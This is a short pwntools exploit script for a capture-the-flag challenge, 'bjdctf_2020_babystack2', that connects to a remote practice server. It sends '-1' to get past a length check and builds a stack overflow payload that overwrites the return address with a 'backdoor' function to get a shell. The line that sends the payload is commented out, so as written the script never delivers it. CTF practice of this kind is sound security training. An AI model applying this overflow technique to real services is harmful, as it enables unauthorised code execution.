from pwn import *


def bjdctf_2020_babystack2(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/bjdctf_2020_babystack2'):
    target = process([file_name])
    target = remote('node5.buuoj.cn', 27207)
    target_elf = ELF(file_name)

    backdoor_addr = p64(target_elf.symbols['backdoor'])

    payload = b'\x00' * (0x10 + 0x8)
    # backdoor()
    payload += backdoor_addr

    target.sendline(b'-1')
    # target.sendlineafter(b"[+]What's u name?", payload)

    target.interactive()


if __name__ == '__main__':
    bjdctf_2020_babystack2()
